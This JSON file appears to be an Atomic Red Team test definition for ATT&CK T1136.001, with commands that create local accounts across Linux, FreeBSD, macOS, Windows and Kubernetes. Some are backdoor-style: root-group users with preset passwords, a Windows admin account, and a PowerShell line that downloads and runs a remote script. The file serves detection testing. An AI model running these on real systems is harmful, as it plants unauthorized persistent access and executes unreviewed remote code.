{
  "attack_technique": "T1136.001",
  "display_name": "Create Account: Local Account",
  "atomic_tests": [
    {
      "name": "Create a user account on a Linux system",
      "description": "Create a user via useradd",
      "supported_platforms": [
        "linux"
      ],
      "executor": {
        "name": "bash",
        "elevation_required": true,
        "cleanup_command": "userdel #{username}",
        "procedure": "useradd -M -N -r -s /bin/bash -c evil_account #{username}"
      },
      "input_arguments": [
        {
          "arg_name": "username",
          "description": "Username of the user to create",
          "type": "string",
          "default": "evil_user"
        }
      ],
      "auto_generated_guid": "40d8eabd-e394-46f6-8785-b9bfa1d011d2"
    },
    {
      "name": "Create a user account on a FreeBSD system",
      "description": "Create a user via pw",
      "supported_platforms": [
        "linux"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": true,
        "cleanup_command": "rmuser -y #{username}",
        "procedure": "pw useradd #{username} -s /usr/sbin/nologin -d /nonexistent -c evil_account"
      },
      "input_arguments": [
        {
          "arg_name": "username",
          "description": "Username of the user to create",
          "type": "string",
          "default": "evil_user"
        }
      ],
      "auto_generated_guid": "a39ee1bc-b8c1-4331-8e5f-1859eb408518"
    },
    {
      "name": "Create a user account on a MacOS system",
      "description": "Creates a user on a MacOS system with dscl",
      "supported_platforms": [
        "macos"
      ],
      "executor": {
        "name": "bash",
        "elevation_required": true,
        "cleanup_command": "dscl . -delete /Users/#{username}",
        "procedure": "dscl . -create /Users/#{username}\ndscl . -create /Users/#{username} UserShell /bin/zsh\ndscl . -create /Users/#{username} RealName \"#{realname}\"\ndscl . -create /Users/#{username} UniqueID \"1010\"\ndscl . -create /Users/#{username} PrimaryGroupID 80\ndscl . -create /Users/#{username} NFSHomeDirectory /Users/#{username}"
      },
      "input_arguments": [
        {
          "arg_name": "username",
          "description": "Username of the user to create",
          "type": "string",
          "default": "evil_user"
        },
        {
          "arg_name": "realname",
          "description": "'realname' to record when creating the user",
          "type": "string",
          "default": "Evil Account"
        }
      ],
      "auto_generated_guid": "01993ba5-1da3-4e15-a719-b690d4f0f0b2"
    },
    {
      "name": "Create a new user in a command prompt",
      "description": "Creates a new user in a command prompt. Upon execution, \"The command completed successfully.\" will be displayed. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_CMD\"",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "cleanup_command": "net user /del \"#{username}\" >nul 2>&1",
        "procedure": "net user /add \"#{username}\" \"#{password}\""
      },
      "input_arguments": [
        {
          "arg_name": "username",
          "description": "Username of the user to create",
          "type": "string",
          "default": "T1136.001_CMD"
        },
        {
          "arg_name": "password",
          "description": "Password of the user to create",
          "type": "string",
          "default": "T1136.001_CMD!"
        }
      ],
      "auto_generated_guid": "6657864e-0323-4206-9344-ac9cd7265a4f"
    },
    {
      "name": "Create a new user in PowerShell",
      "description": "Creates a new user in PowerShell. Upon execution, details about the new account will be displayed in the powershell session. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_PowerShell\"",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "cleanup_command": "Remove-LocalUser -Name \"#{username}\" -ErrorAction Ignore",
        "procedure": "New-LocalUser -Name \"#{username}\" -NoPassword"
      },
      "input_arguments": [
        {
          "arg_name": "username",
          "description": "Username of the user to create",
          "type": "string",
          "default": "T1136.001_PowerShell"
        }
      ],
      "auto_generated_guid": "bc8be0ac-475c-4fbf-9b1d-9fffd77afbde"
    },
    {
      "name": "Create a new user in Linux with `root` UID and GID.",
      "description": "Creates a new user in Linux and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.",
      "supported_platforms": [
        "linux"
      ],
      "executor": {
        "name": "bash",
        "elevation_required": true,
        "cleanup_command": "userdel #{username}",
        "procedure": "useradd -g 0 -M -d /root -s /bin/bash #{username}\nif [ $(cat /etc/os-release | grep -i 'Name=\"ubuntu\"') ]; then echo \"#{username}:#{password}\" | sudo chpasswd; else echo \"#{password}\" | passwd --stdin #{username}; fi;"
      },
      "input_arguments": [
        {
          "arg_name": "username",
          "description": "Username of the user to create",
          "type": "string",
          "default": "butter"
        },
        {
          "arg_name": "password",
          "description": "Password of the user to create",
          "type": "string",
          "default": "BetterWithButter"
        }
      ],
      "auto_generated_guid": "a1040a30-d28b-4eda-bd99-bb2861a4616c"
    },
    {
      "name": "Create a new user in FreeBSD with `root` GID.",
      "description": "Creates a new user in FreeBSD and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.",
      "supported_platforms": [
        "linux"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": true,
        "cleanup_command": "pw userdel #{username}",
        "procedure": "pw useradd #{username} -g 0 -d /root -s /bin/sh\necho \"#{password}\" | pw usermod #{username} -h 0"
      },
      "input_arguments": [
        {
          "arg_name": "username",
          "description": "Username of the user to create",
          "type": "string",
          "default": "butter"
        },
        {
          "arg_name": "password",
          "description": "Password of the user to create",
          "type": "string",
          "default": "BetterWithButter"
        }
      ],
      "auto_generated_guid": "d141afeb-d2bc-4934-8dd5-b7dba0f9f67a"
    },
    {
      "name": "Create a new Windows admin user",
      "description": "Creates a new admin user in a command prompt.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "cleanup_command": "net user /del \"#{username}\" >nul 2>&1",
        "procedure": "net user /add \"#{username}\" \"#{password}\"\nnet localgroup administrators \"#{username}\" /add"
      },
      "input_arguments": [
        {
          "arg_name": "username",
          "description": "Username of the user to create",
          "type": "string",
          "default": "T1136.001_Admin"
        },
        {
          "arg_name": "password",
          "description": "Password of the user to create",
          "type": "string",
          "default": "T1136_pass"
        }
      ],
      "auto_generated_guid": "fda74566-a604-4581-a4cc-fbbe21d66559"
    },
    {
      "name": "Create a new Windows admin user via .NET",
      "description": "Creates a new admin user in a powershell session without using net.exe",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "procedure": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')"
      },
      "input_arguments": [],
      "auto_generated_guid": "2170d9b5-bacd-4819-a952-da76dae0815f"
    },
    {
      "name": "Create a Linux user via kubectl in a Pod",
      "description": "Launches a short-lived Alpine pod and creates a Linux user inside the pod.\nThe pod is automatically deleted after execution.",
      "supported_platforms": [
        "containers"
      ],
      "executor": {
        "name": "bash",
        "elevation_required": false,
        "procedure": "kubectl run #{pod_name} --image=#{image_name} --restart=Never --rm -it -- sh -lc 'adduser -D #{username} && id #{username}'"
      },
      "input_arguments": [
        {
          "arg_name": "pod_name",
          "description": "K8s pod_name to execute the command in",
          "type": "string",
          "default": "atomic-linux-useradd"
        },
        {
          "arg_name": "username",
          "description": "Username of the user to create inside the pod",
          "type": "string",
          "default": "evil_user"
        },
        {
          "arg_name": "image_name",
          "description": "Name of the docker image",
          "type": "string",
          "default": "alpine"
        }
      ],
      "dependencies": [
        {
          "description": "kubectl must be installed and configured",
          "prereq_command": "which kubectl",
          "get_prereq_command": "echo \"kubectl must be installed manually\""
        }
      ],
      "auto_generated_guid": "d9efa6c7-6518-42b2-809a-4f2a8e242b9b"
    }
  ]
}